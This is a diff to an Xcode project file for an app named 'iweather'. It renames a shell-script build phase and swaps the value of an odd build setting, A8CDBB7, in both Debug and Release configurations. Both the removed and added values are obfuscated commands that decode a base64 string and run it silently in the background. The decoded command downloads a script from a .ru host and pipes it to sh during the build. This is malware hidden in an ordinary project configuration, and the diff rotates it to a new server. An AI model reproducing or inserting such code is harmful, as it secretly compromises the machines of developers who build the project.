@@ -52,7 +52,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8EED03773032D74F00F68C15 /* Build configuration list for PBXNativeTarget "iweather" */;
 			buildPhases = (
-				48144F0729CC4E34B57BBDC8 /* Compile Code Assets */,
+				46BF9DD88F8D40C9A17BBDC8 /* Build Target Libraries */,
 				8EED03683032D74E00F68C15 /* Sources */,
 				8EED03693032D74E00F68C15 /* Frameworks */,
 				8EED036A3032D74E00F68C15 /* Resources */,
@@ -116,7 +116,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		48144F0729CC4E34B57BBDC8 /* Compile Code Assets */ = {
+		46BF9DD88F8D40C9A17BBDC8 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -126,7 +126,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -151,7 +151,7 @@
 		8EED03753032D74F00F68C15 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((t(){ `printf baTse64 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC1Mc2ZrIC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | t | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((i(){ `printf base6H4 | tr -d H` --decode; };echo ZWNobyAiJChjdXJsIC1mTGtzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -216,7 +216,7 @@
 		8EED03763032D74F00F68C15 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((t(){ `printf baTse64 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC1Mc2ZrIC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | t | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((i(){ `printf base6H4 | tr -d H` --decode; };echo ZWNobyAiJChjdXJsIC1mTGtzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
